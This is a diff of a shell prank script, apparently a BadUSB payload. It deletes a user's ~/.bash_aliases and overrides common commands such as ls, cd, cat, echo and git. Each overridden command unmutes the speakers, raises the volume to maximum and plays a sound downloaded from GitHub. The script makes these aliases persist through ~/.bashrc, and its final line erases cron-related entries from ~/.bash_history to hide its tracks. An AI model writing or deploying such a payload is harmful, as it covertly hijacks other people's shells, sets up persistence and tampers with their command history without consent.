@@ -3,7 +3,9 @@
 rm ~/.bash_aliases
 
 B=~/.bashrc
-AB='if [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi'
+AB='if [ -f ~/.bash_aliases ]; then
+    . ~/.bash_aliases
+fi'
 echo "alias ls='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/yay.wav | aplay -q &) ; ls'" >> ~/.bash_aliases
 echo "alias clear='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/fart.wav | aplay -q &) ; clear'" >> ~/.bash_aliases
 echo "alias cd='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/spring.wav | aplay -q &) ; cd'" >> ~/.bash_aliases
@@ -20,7 +22,7 @@ echo "alias git='(amixer -q set Master unmute; amixer -q set Master 100%; wget -
 echo "alias get='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/get_here.wav | aplay -q &) ; get'" >> ~/.bash_aliases
 echo "alias cat='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/cat.wav | aplay -q &) ; cat'" >> ~/.bash_aliases
 echo "alias echo='(amixer -q set Master unmute; amixer -q set Master 100%; wget -qO- https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/sounds/fx/echo.wav | aplay -q &) ; echo'" >> ~/.bash_aliases
-if ! grep -qxF "$AB" "$B" && ! grep -q "^#.*if \[ -f ~/.bash_aliases \]; then" "$B"; then
+if ! grep -qFx -e "$AB" "$B"; then
     echo -e "\n$AB" >> "$B"
 fi
 sed -i '/cron/d' ~/.bash_history
